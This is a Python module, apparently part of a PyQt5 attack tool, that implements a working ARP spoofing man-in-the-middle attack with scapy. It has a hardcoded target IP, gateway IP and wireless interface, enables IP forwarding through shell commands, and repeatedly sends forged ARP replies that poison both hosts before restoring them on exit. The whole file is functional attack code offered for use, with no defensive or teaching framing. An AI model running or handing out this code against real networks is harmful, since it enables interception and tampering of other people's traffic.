import scapy.all as scapy
from scapy.all import get_if_hwaddr
import time
from PyQt5.QtCore import QObject, QThread, pyqtSignal, QWaitCondition, QMutex

class SofiaArpSpoofAttack(QObject):

	finished = pyqtSignal()

	def __init__(self, append_log, loop) -> None:
		super().__init__()

		self.loop = loop
		self.done = False
		self.append_log = append_log
		self.g_target_ip = "192.168.43.154" # Enter your target IP
		self.g_gateway_ip = "192.168.43.1" # Enter your gateway's IP
		self.iface = "wlan0"

	def get_mac(self, ip):
		arp_request = scapy.ARP(pdst = ip)
		broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
		arp_request_broadcast = broadcast / arp_request
		try:
			answered_list = scapy.srp(arp_request_broadcast, iface=self.iface, timeout = 5)[0]
		except Exception as e:
			self.append_log(f"[ARP] Failed with error: {e}")
			return False

		# Check if there is a response
		if not answered_list.res:
			return False

		mac = answered_list[0][1].hwsrc
		self.append_log(f"[ARP] Got MAC address of IP: {ip} is {mac}")
		return mac

	def set_loop(self, loop):
		self.loop = loop

	def spoof(self):
		scapy.send(scapy.ARP(op=2, pdst=self.g_target_ip, hwdst=self.target_mac, psrc=self.g_gateway_ip), verbose=False)
		scapy.send(scapy.ARP(op=2, pdst=self.g_gateway_ip, hwdst=self.gw_mac, psrc=self.g_target_ip), verbose=False)
		return True

	def stop_attack(self):
		self.append_log("[ARP] Restoring IP addresses ...")
		scapy.send(scapy.ARP(op = 2, pdst=self.g_gateway_ip, hwdst=self.gw_mac, psrc=self.g_target_ip, hwsrc=self.target_mac), verbose=False)
		scapy.send(scapy.ARP(op = 2, pdst=self.g_target_ip, hwdst=self.target_mac, psrc=self.g_gateway_ip, hwsrc=self.gw_mac), verbose=False)
		self.disable_ip_forward()
		self.check_ip_forward()

	def enable_ip_forward(self):
		import os
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

	def disable_ip_forward(self):
		import os
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

	def check_ip_forward(self):
		with open("/proc/sys/net/ipv4/ip_forward", "r") as file:
			self.append_log(f"IP FORWARD = {file.read()}")

	def run(self):

		self.enable_ip_forward()
		self.check_ip_forward()

		self.append_log(f"[ARP] Starting the attack: loop={self.loop}")
		self.gw_mac = self.get_mac(self.g_gateway_ip)
		self.target_mac = self.get_mac(self.g_target_ip)
		if not self.gw_mac or not self.target_mac:
			self.append_log(f"[ARP] Cannot get MAC of T={self.g_gateway_ip} or G={self.g_target_ip}")
			self.finished.emit()
			self.done = True

		try:
			sent_packets_count = 0
			self.append_log(f"[ARP] ARP Spoofing attack is working ...")
			while self.loop:
				if not self.spoof() or not self.spoof():
					self.append_log("[ARP] Stopping the Attack ..")
					break
				sent_packets_count = sent_packets_count + 2
				self.append_log("\r[ARP] Packets Sent "+str(sent_packets_count))
				time.sleep(2) # Waits for two seconds
			self.stop_attack()
			self.finished.emit()
			self.done = True

		except KeyboardInterrupt:
			self.append_log("\nCtrl + C pressed.............Exiting")
			self.stop_attack()